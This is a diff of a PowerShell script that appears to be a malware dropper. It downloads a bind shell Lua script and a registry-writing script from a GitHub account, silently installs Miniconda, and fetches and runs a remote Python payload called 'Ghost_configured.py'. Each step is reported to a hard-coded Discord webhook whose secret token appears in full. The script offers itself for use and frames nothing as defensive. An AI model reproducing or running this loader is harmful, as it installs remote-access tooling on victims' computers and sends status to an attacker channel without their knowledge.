@@ -6,19 +6,20 @@ $luaJitZip = "$baseDir\LuaJIT-2.1.zip"
 $luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
 $bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
 $regwriteScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
-$pythonEnvZipUrl = "https://www.dropbox.com/scl/fi/6ghhk00dw3zalvia56prb/env.zip?rlkey=n5qj3jwp18jj0jiw31r7vtcrd&st=80f4xypt&dl=1"
 $ghostConfigPyUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/Ghost_configured.py"
 $bindshellScriptPath = "$baseDir\bindshell.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
-$pythonEnvZipPath = "$baseDir\python-env.zip"
 $ghostConfigPyPath = "$baseDir\Ghost_configured.py"
-$pythonEnvPath = "$baseDir\env"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 $luaJitPath = "$baseDir\LuaJIT-2.1"
 $luaPathDir = "$baseDir\Luapath"
 $jitDir = "$luaPathDir\src\jit"
 $srcDir = "$luaPathDir\src"
 $jitSourceDir = "$luaJitPath"
+
+$minicondaInstallerUrl = "https://repo.anaconda.com/miniconda/Miniconda3-latest-Windows-x86_64.exe"
+$minicondaInstallerPath = "$env:TEMP\Miniconda3-latest-Windows-x86_64.exe"
+$environmentYmlPath = "$baseDir\environment.yml"
 
 # Function to send messages to Discord webhook
 function Send-DiscordMessage {
@@ -31,7 +32,7 @@ function Send-DiscordMessage {
     Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
 }
 
-# Function to check if a file exists and wait if it doesn't
+# Function to check if a file exists and wait if it doesn't# Function to check if a file exists and wait if it doesn't
 function Wait-ForFile {
     param (
         [string]$FilePath,
@@ -132,42 +133,55 @@ function Get-And-Extract-LuaJIT {
     }
 }
 
-# Function to download, wait, and execute Ghost_configured.py with python.exe
-function Get-Execute-GhostConfig {
-    if (-not (Test-Path $ghostConfigPyPath)) {
-        $message = "Getting Ghost_configured.py..."
-        Send-DiscordMessage -message $message
-        Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
-        Wait-ForMinute
+# Check if conda is installed
+function Test-Conda {
+    try {
+        & conda --version
+        return $true
+    } catch {
+        return $false
     }
+}
 
-    if (-not (Test-Path "$pythonEnvPath\env\python.exe")) {
-        $message = "Getting Python environment ZIP file..."
-        Send-DiscordMessage -message $message
-        Get-File -url $pythonEnvZipUrl -destination $pythonEnvZipPath
-        Wait-ForMinute
+# Install Miniconda silently
+function Install-Miniconda {
+    param (
+        [string]$installerPath
+    )
+    Start-Process -Wait -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1"
+}
 
-        $message = "Extracting Python environment ZIP file..."
-        Send-DiscordMessage -message $message
-        Expand-Archive -Path $pythonEnvZipPath -DestinationPath $pythonEnvPath
-        Wait-ForFile -FilePath "$pythonEnvPath\env\python.exe"
-        Send-DiscordMessage -message "Extraction of Python environment completed."
-        Wait-ForMinute
-    }
+# Create conda environment from environment.yml
+function New-CondaEnv {
+    param (
+        [string]$envFilePath
+    )
+    conda env create -f $envFilePath
+}
 
-    if (Test-Path "$pythonEnvPath\env\python.exe") {
-        $message = "Executing Ghost_configured.py with python.exe..."
-        Send-DiscordMessage -message $message
-        Start-Process -FilePath "$pythonEnvPath\env\python.exe" -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
-        Wait-ForMinute
-        Wait-ForMinute
-        $message = "Execution of Ghost_configured.py completed."
-        Send-DiscordMessage -message $message
-        Wait-ForMinute
-    } else {
-        $message = "Python environment setup failed, python.exe not found."
-        Send-DiscordMessage -message $message
-    }
+# Activate conda environment
+function Invoke-CondaEnv {
+    param (
+        [string]$envName
+    )
+    conda activate $envName
+}
+
+# Download Ghost_configured.py
+function Get-GhostConfig {
+    param (
+        [string]$url,
+        [string]$destination
+    )
+    Invoke-WebRequest -Uri $url -OutFile $destination
+}
+
+# Execute Ghost_configured.py
+function Invoke-GhostConfig {
+    param (
+        [string]$scriptPath
+    )
+    python $scriptPath
 }
 
 # Create the base directory if it doesn't exist
@@ -292,5 +306,35 @@ try {
     pause
 }
 
-# Download and execute Ghost_configured.py with Python
-Get-Execute-GhostConfig
+# Main script
+Send-DiscordMessage -message "Starting the setup script..."
+
+if (-not (Test-Conda)) {
+    Send-DiscordMessage -message "Conda not found. Downloading Miniconda..."
+    Get-File -url $minicondaInstallerUrl -destination $minicondaInstallerPath
+
+    Send-DiscordMessage -message "Installing Miniconda..."
+    Install-Miniconda -installerPath $minicondaInstallerPath
+} else {
+    Send-DiscordMessage -message "Conda is already installed."
+}
+
+# Create conda environment from environment.yml if not already done
+if (-not (Test-Path "$env:TEMP\ZZ\env\python.exe")) {
+    Send-DiscordMessage -message "Python environment not found. Creating conda environment from environment.yml..."
+    New-CondaEnv -envFilePath $environmentYmlPath
+} else {
+    Send-DiscordMessage -message "Python environment already exists."
+}
+
+# Activate conda environment
+Send-DiscordMessage -message "Activating the conda environment..."
+Invoke-CondaEnv -envName "env"
+
+# Download and execute Ghost_configured.py
+Send-DiscordMessage -message "Downloading and executing Ghost_configured.py..."
+Get-GhostConfig -url $ghostConfigPyUrl -destination $ghostConfigPyPath
+
+Invoke-GhostConfig -scriptPath $ghostConfigPyPath
+
+Send-DiscordMessage -message "Setup script completed."
